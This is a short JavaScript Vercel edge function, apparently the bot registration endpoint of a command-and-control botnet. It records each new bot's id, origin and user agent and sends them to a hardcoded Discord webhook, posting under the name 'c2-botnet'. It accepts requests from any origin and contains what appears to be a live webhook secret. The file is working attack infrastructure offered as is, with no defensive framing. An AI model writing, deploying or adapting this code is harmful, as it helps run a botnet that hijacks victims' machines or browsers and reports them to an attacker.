// api/register.js
import { get } from '@vercel/edge-config';

export const config = { runtime: 'edge' };

const discord_webhook_url = 'https://discord.com/api/webhooks/1516092945067933797/tI4BBfCLmWm4IgcUk9_b3WiurJM5z1FWn1uJ33HcN0RcqTmQJlqU0aIXcaDQdz7S_6Or'

export default async function handler(req) {
  try {
    const { bot_id, origin, ua } = await req.json();
    const embed = {
      title: '💥 new bot online',
      color: 3066993, // green
      fields: [
        { name: 'bot id', value: `\`${bot_id}\`` },
        { name: 'origin', value: origin },
        { name: 'user agent', value: `\`${ua}\`` },
      ],
      timestamp: new Date().toISOString(),
    };
    fetch(discord_webhook_url, {
      method: 'post',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ username: 'c2-botnet', embeds: [embed] }),
    });
    return new Response(null, {
      status: 204,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, Authorization',
      },
    });
  } catch (error) {
    console.error('Function error:', error);
    return new Response('An error occurred while processing the request', { status: 500 });
  }
}
